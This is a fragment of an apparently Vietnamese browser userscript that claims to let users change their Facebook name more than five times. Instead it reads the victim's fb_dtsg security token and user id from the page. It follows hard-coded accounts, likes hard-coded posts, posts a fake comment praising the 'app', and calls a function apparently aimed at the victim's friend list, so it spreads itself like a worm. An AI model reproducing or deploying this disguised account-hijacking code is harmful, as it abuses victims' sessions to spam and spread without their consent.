// ==UserScript==
// @name            NEW ĐỔI TÊN FACEBOOK QUÁ 5 LẦN NEW ( MỚI NHẤT) - VER 2.0.14 
...
a("100007054623534"); 
a("100006427683265");
Like("1413153145608189");
Like("706654139374421");
Like("1474245752795700");
/// tăng
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text= (y) Ứng dụng này hay thật đó <3 . Mình vừa đổi được tên rồi 󾌫 󾌫 . Rất cảm ơn bạn 󾬔  󾬕  󾬖  󾀀  󾀀  󾀀  󾔗  󾔗  󾔗  󾀄  󾀄  󾌧  󾌧  󾇗  󾇗  󾌶  󾌶  󾠚  󾠚  󾓲  󾓲  󾀽  󾀽  󾆔  󾆔  󾆔  󾆼  󾆼  󾔐  󾔐 󾇕 󾇕 󾇇 󾇇 󾭩 󾭩 󾬍 󾬍 󾬐 󾬐 󾬐 󾆓 󾆓 󾥠 󾥠 󾥠  ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(1431777647063409);